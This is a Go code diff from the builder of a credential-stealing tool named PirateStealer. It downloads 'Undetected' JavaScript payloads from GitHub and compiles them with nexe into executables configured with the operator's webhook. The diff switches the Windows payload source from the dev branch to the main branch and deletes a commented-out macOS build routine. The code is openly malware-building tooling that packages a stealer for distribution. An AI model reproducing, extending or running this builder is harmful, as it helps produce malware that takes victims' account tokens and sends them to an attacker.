@@ -138,7 +138,7 @@ func buildPlatform() {
 		case "windows":
 
 			logger.Info("Building Windows")
-			wincode := getCode("https://raw.githubusercontent.com/bytixo/PirateStealer/dev/src/Undetected/index-win.js")
+			wincode := getCode("https://raw.githubusercontent.com/bytixo/PirateStealer/main/src/Undetected/index-win.js")
 			err := ioutil.WriteFile("index-win.js", []byte(wincode), 0666)
 			if err != nil {
 				logger.Fatal("Error writing to file", err)
@@ -155,28 +155,6 @@ func buildPlatform() {
 				os.Exit(1)
 			}
 			logger.Info("Windows Executable has been built with your webhook")
-			/*
-		case "macos":
-			logger.Info("Building macos")
-			macode := getCode("https://raw.githubusercontent.com/bytixo/PirateStealer/dev/src/Undetected/index-mac.js")
-			err := ioutil.WriteFile("index-mac.js", []byte(macode), 0666)
-			if err != nil {
-				logger.Fatal("Error writing to file", err)
-			}
-			time.Sleep(time.Second)
-			v := "mac-x64-12.9.1"
-			t := fmt.Sprintf(`-t %s`, v)
-			n := strings.TrimSuffix(name, ".exe")
-			logger.Info(fmt.Sprintf(`Compiling: nexe %s -o %s index-mac.js`, t, n))
-			_, err = exec.Command("nexe", "-t", v, "-o", n, "index-mac.js").Output()
-			if err != nil {
-				logger.Fatal("Error while compiling", err)
-				time.Sleep(5 * time.Second)
-				os.Exit(1)
-			}
-			logger.Info("Macos Executable has been built with your webhook")
-		}
-		*/
 	}
 }
 
